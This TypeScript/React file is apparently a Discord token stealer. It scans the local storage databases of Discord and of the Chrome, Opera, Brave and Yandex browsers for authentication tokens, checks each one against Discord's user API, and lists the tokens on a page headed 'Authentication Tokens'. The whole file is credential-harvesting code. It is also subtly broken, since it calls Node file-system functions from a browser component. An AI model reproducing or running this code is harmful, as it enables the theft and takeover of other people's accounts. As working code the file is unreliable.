import React from 'react';

// Import necessary modules
import process from 'process';
import * as fs from 'fs';

const LOCALAPPDATA = process.env.LOCALAPPDATA;
const APPDATA = process.env.APPDATA;

interface Paths {
    [key: string]: string;
}

const PATHS: Paths = {
    "Discord": APPDATA + "\\Discord",
    "Discord Canary": APPDATA + "\\discordcanary",
    "Discord PTB": APPDATA + "\\discordptb",
    "Google Chrome": LOCALAPPDATA + "\\Google\\Chrome\\User Data\\Default",
    "Opera": APPDATA + "\\Opera Software\\Opera Stable",
    "Brave": LOCALAPPDATA + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCALAPPDATA + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

function getTokens(platform: string, path: string): { platform: string; token: string }[] {
    path = path + "\\Local Storage\\leveldb";
    const listToken: { platform: string; token: string }[] = [];

    try {
        const fileNames = fs.readdirSync(path);
        for (const file_name of fileNames) {
            if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
                continue;
            }
            const filePath = path + "\\" + file_name;

            const fileContent = fs.readFileSync(filePath, 'utf-8');
            const lines = fileContent.split(/\r?\n/);

            for (const line of lines) {
                if (line.trim() === '') {
                    continue;
                }

                const regexs = [/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/];
                for (const regex of regexs) {
                    const Token = regex.exec(line);
                    if (Token !== null) {
                        listToken.push({ platform, token: Token[0] });
                    }
                }
            }
        }
    } catch (error) {
        console.error("Error reading directory:", path);
        console.error(error);
    }

    return listToken;
}

const getheaders = (j4j:any, content_type = "application/json") => {
    const headers = new Headers();
    headers.set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");

    if (j4j) {
        headers.set("Authorization", j4j);
    }

    // For setting the content type
    // Note: 'Content-Type' is set using 'set' method
    headers.set("Content-Type", content_type);

    return headers;
};
const getuserdata = async (j4j: any) => {
    try {
        const response = await fetch("https://discordapp.com/api/v6/users/@me", {
            headers: getheaders(j4j)
        });

        if (response.ok) {
            const userData = await response.json();
            console.log(userData);
            
            return userData;
        } else {
            console.error(`HTTP error! Status: ${response.status}`);
            return null;
        }
    } catch (error) {
        console.error("Error fetching data:", error);
        return null;
    }
};


const Page: React.FC = () => {
    const allTokens: { platform: string; token: string }[] = [];

    // Iterate over the keys of PATHS object
    for (const key in PATHS) {
        if (PATHS.hasOwnProperty(key)) {
            const platform = key;
            const path = PATHS[key];
            const tokens = getTokens(platform, path);
            allTokens.push(...tokens);
        }
        
    }

    // Sending requests without useEffect
    const fetchData = async () => {
        for (const tokenInfo of allTokens) {
            try {
                const userData = await getuserdata(tokenInfo.token);
                console.log(`User data for ${tokenInfo.platform}:`, userData);
                // Do something with the user data, e.g., update state or display it
            } catch (error) {
                console.error(`Error fetching data for ${tokenInfo.platform}:`, error);
            }
        }
    };

    // Call the fetchData function
    fetchData();

    // Render the component as before
    return (
        <div>
            <h1>Authentication Tokens</h1>
            <ul>
                {allTokens.map((tokenInfo, index) => (
                    <li key={index}>
                        <strong>Platform:</strong> {tokenInfo.platform}, <strong>Token:</strong> {tokenInfo.token}
                    </li>
                ))}
            </ul>
        </div>
    );
}

export default Page;
